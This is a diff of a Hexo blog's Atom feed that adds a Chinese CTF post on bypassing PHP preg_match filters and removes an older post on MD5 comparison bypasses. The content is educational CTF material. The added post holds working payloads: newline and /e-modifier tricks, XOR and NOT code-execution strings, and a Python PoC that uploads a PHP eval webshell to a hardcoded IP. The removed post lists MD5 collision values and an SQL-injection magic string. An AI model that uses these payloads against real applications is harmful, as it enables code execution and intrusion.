@@ -6,7 +6,7 @@
   <link href="https://sakurahack-y.github.io/atom.xml" rel="self"/>
   
   <link href="https://sakurahack-y.github.io/"/>
-  <updated>2021-10-25T05:44:21.834Z</updated>
+  <updated>2021-10-26T14:39:18.477Z</updated>
   <id>https://sakurahack-y.github.io/</id>
   
   <author>
@@ -15,6 +15,34 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>preg_match正则绕过总结</title>
+    <link href="https://sakurahack-y.github.io/2021/10/26/preg-match%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/"/>
+    <id>https://sakurahack-y.github.io/2021/10/26/preg-match%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</id>
+    <published>2021-10-26T10:19:19.000Z</published>
+    <updated>2021-10-26T14:39:18.477Z</updated>
+    
+    <content type="html"><![CDATA[<p>最近写题遇到了很多次pre_match函数，但并不是每次都可以绕过。于是想要把这个函数总结一下用法。我个人认为preg_match的绕过方法主要取决于其正则表达式的写法。</p><p>首先对正则表达式的常见符号解释一下。</p><p>/    /    是一种格式吧，正则表达式需要写在这个里面</p><p>^：匹配输入字符串的开始位置</p><p>$：匹配输入字符串的结束位置</p><h1 id="换行符绕过-0a"><a href="#换行符绕过-0a" class="headerlink" title="换行符绕过(%0a)"></a>换行符绕过(%0a)</h1><pre><code class="php">&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);$c = $_GET[&#39;c&#39;];if (preg_match(&#39;/^flag$/i&#39;, $c) &amp;&amp; $c !== &#39;flag&#39;) &#123;    echo $flag;&#125;else&#123;    echo &quot;nonono&quot;;&#125;</code></pre><p>由于pre_match这个函数是只能匹配一行的数据，所以我们可以用%0a(也就是换行符)来绕过。</p><p>这里是因为$会忽略换行符</p><p>因此本题我们传入?c=flag%0a  即可绕过</p><p>注意此时正则表达式的模式是: i</p><pre><code># 数组绕过</code></pre><p> preg_match只能处理字符串，当传入的subject是数组时会返回false</p><h1 id="5c绕过"><a href="#5c绕过" class="headerlink" title="%5c绕过"></a>%5c绕过</h1><pre><code class="php">&lt;?php show_source(__FILE__); $key = &quot;bad&quot;; extract($_POST);        // 使用POST接收参数 if($key === &#39;bad&#39;)&#123;        // $key 与 &#39;bad&#39; 进行比较，值不相同时才可以继续运行代码    die(&#39;badbad!!!&#39;); &#125; $act = @$_GET[&#39;act&#39;];    // 获得 act 参数 $arg = @$_GET[&#39;arg&#39;];    // 获得 arg 参数 if(preg_match(&#39;/^[a-z0-9_]*$/isD&#39;,$act)) &#123;    // 针对act参数进行过滤    echo &#39;check&#39;; &#125; else &#123;    $act($arg,&#39;&#39;);        // 动态调用 &#125; echo &#39;666&#39;;</code></pre><pre><code>/i不区分大小写/s匹配任何不可见字符，包括空格、制表符、换页符等等，等价于[fnrtv]/D如果使用$限制结尾字符,则不允许结尾有换行;</code></pre><p>这里存在/s和/D因此它会匹配到换行，%0a因此就无法绕过。这时候就可以使用%5c</p><h1 id="preg-match-“-e”-注：php版本需要小于5-5-0"><a href="#preg-match-“-e”-注：php版本需要小于5-5-0" class="headerlink" title="preg_match(“/^$/e”) (注：php版本需要小于5.5.0)"></a>preg_match(“/^$/e”) (注：php版本需要小于5.5.0)</h1><pre><code class="php">&lt;?highlight_file(__FILE__);echo preg_replace(&quot;/test/e&quot;,$_GET[&quot;h&quot;],&quot;jutst test&quot;);?&gt;</code></pre><p>payload=xx?h=phpinfo();</p><h1 id="PHP利用PCRE回溯次数限制绕过某些安全限制"><a href="#PHP利用PCRE回溯次数限制绕过某些安全限制" class="headerlink" title="PHP利用PCRE回溯次数限制绕过某些安全限制"></a>PHP利用PCRE回溯次数限制绕过某些安全限制</h1><p>poc</p><pre><code class="php">import requestsfrom io import BytesIOfiles = &#123;  &#39;file&#39;: BytesIO(b&#39;aaa&lt;?php eval($_POST[txt]);//&#39; + b&#39;a&#39; * 1000000)&#125;res = requests.post(&#39;http://51.158.75.42:8088/index.php&#39;, files=files, allow_redirects=False)print(res.headers)</code></pre><p>payload:?a=ssss………..省略n个字符，突破100万</p><h1 id="异或绕过"><a href="#异或绕过" class="headerlink" title="异或绕过"></a>异或绕过</h1><pre><code class="php">&lt;?phperror_reporting(0);if(isset($_GET[&#39;code&#39;]))&#123;        $code=$_GET[&#39;code&#39;];            if(strlen($code)&gt;40)&#123;                    die(&quot;This is too Long.&quot;);                    &#125;            if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;                    die(&quot;NO.&quot;);                    &#125;            @eval($code);&#125;else&#123;        highlight_file(__FILE__);&#125;highlight_file(__FILE);// ?&gt;</code></pre><p>可以使用各种特殊字符的异或构造出字母和数字</p><p>脚本：</p><pre><code class="php">str = r&quot;~!@#$%^&amp;*()_+&lt;&gt;?,.;:-[]&#123;&#125;/&quot;for i in range(0, len(str)):    for j in range(0, len(str)):        a = ord(str[i])^ord(str[j])        print(str[i] + &#39; ^ &#39; + str[j] + &#39; is &#39; + chr(a))</code></pre><p>payload:</p><pre><code class="php">?code=$_=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$_&#125;[_]();&amp;_=phpinfo</code></pre><h1 id="取反绕过"><a href="#取反绕过" class="headerlink" title="取反绕过"></a>取反绕过</h1><p>把getFlag取反然后URL编码： </p><pre><code class="php"> &lt;?php echo urlencode(~&quot;getFlag&quot;); </code></pre><p>–&gt; %98%9A%8B%B9%93%9E%98</p><p>依据这个我们可以构造payload: </p><pre><code class="php"> ?code=$_=~%98%9A%8B%B9%93%9E%98;$_(); </code></pre>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;最近写题遇到了很多次pre_match函数，但并不是每次都可以绕过。于是想要把这个函数总结一下用法。我个人认为preg_match的绕过方法主要取决于其正则表达式的写法。&lt;/p&gt;
+&lt;p&gt;首先对正则表达式的常见符号解释一下。&lt;/p&gt;
+&lt;p&gt;/    /    是一种格式吧，正</summary>
+      
+    
+    
+    
+    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
+    
+    <category term="常见函数" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0/"/>
+    
+    
+    <category term="preg_match" scheme="https://sakurahack-y.github.io/tags/preg-match/"/>
+    
+  </entry>
   
   <entry>
     <title>GWCTF 2019枯燥的抽奖_0x30-0x3f</title>
@@ -535,32 +563,6 @@ import has</summary>
     
     
     <category term="脚本" scheme="https://sakurahack-y.github.io/tags/%E8%84%9A%E6%9C%AC/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>MD5绕过手法</title>
-    <link href="https://sakurahack-y.github.io/2021/10/08/MD5%E6%BC%8F%E6%B4%9E/"/>
-    <id>https://sakurahack-y.github.io/2021/10/08/MD5%E6%BC%8F%E6%B4%9E/</id>
-    <published>2021-10-08T15:23:21.417Z</published>
-    <updated>2021-10-08T16:05:22.842Z</updated>
-    
-    <content type="html"><![CDATA[<p>ffifdyop，这个点的原理是 ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，<br>再转换为字符串：’or’6&lt;乱码&gt;  即  ‘or’66�]��!r,��b<br>这个字符串前几位刚好是 ‘ or ‘6，</p><p>md5(string,raw)</p><p>md5()进行比较时，可以两个里面输入数组，这样都是False,等于，可以绕过</p><p>0e绕过</p><pre><code>0e开头的字符串在参与比较时,会被当做科学计数法,结果转换为0</code></pre><p> 比如将两个md5值进行弱类型比较</p><p>md5(‘QNKCDZO’) == md5(240610708)</p><p>MD5加密后会变成这个样子</p><p>0e830400451993494058024219903391 == 0e462097431906509019562988736854</p><p>由于0e开头的字符串会转换为0,所以真正比较的过程会变成下面这样</p><p>0 == 0</p><p>返回结果为true,也就是说0e开头的md5值进行弱类型比较时,结果相等<br>s878926199a<br>0e545993274517709034328855841020<br>s155964671a<br>0e342768416822451524974117254469<br>s214587387a<br>0e848240448830537924465865611904<br>s214587387a<br>0e848240448830537924465865611904<br>s878926199a<br>0e545993274517709034328855841020</p><p>强类型<br>(string)$_POST[‘a’]!==(string)$_POST[‘b’] &amp;&amp; md5($_POST[‘a’])===md5($_POST[‘b’])<br>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</p><p>收录一些MD5值相等的字符串</p><pre><code>$Param1=&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;;$Param2=&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;;$data1=&quot;\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x07\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\xf1\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\x72\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\x34\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\x28\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\xab\x6f\xf7\x2a\x70&quot;;$data2=&quot;\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x87\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\x71\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\xf2\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\xb4\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\xa8\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\x2b\x6f\xf7\x2a\x70&quot;;</code></pre><p>双md5结果仍为0e开头字符串大全</p><pre><code>MD5大全： CbDLytmyGm2xQyaLNhWn md5(CbDLytmyGm2xQyaLNhWn) =&gt; 0ec20b7c66cafbcc7d8e8481f0653d18 md5(md5(CbDLytmyGm2xQyaLNhWn)) =&gt; 0e3a5f2a80db371d4610b8f940d296af 770hQgrBOjrcqftrlaZk md5(770hQgrBOjrcqftrlaZk) =&gt; 0e689b4f703bdc753be7e27b45cb3625 md5(md5(770hQgrBOjrcqftrlaZk)) =&gt; 0e2756da68ef740fd8f5a5c26cc45064 7r4lGXCH2Ksu2JNT3BYM md5(7r4lGXCH2Ksu2JNT3BYM) =&gt; 0e269ab12da27d79a6626d91f34ae849 md5(md5(7r4lGXCH2Ksu2JNT3BYM)) =&gt; 0e48d320b2a97ab295f5c4694759889f</code></pre><p>md5(‘0e215962017’) ==&gt; “0e291242476940776845150308577824”</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;ffifdyop，这个点的原理是 ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，&lt;br&gt;再转换为字符串：’or’6&amp;lt;乱码&amp;gt;  即  ‘or’66�]��!r,��b&lt;br&gt;这个字符串前</summary>
-      
-    
-    
-    
-    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
-    
-    <category term="绕过" scheme="https://sakurahack-y.github.io/categories/CTF/%E7%BB%95%E8%BF%87/"/>
-    
-    
-    <category term="绕过" scheme="https://sakurahack-y.github.io/tags/%E7%BB%95%E8%BF%87/"/>
     
   </entry>
   
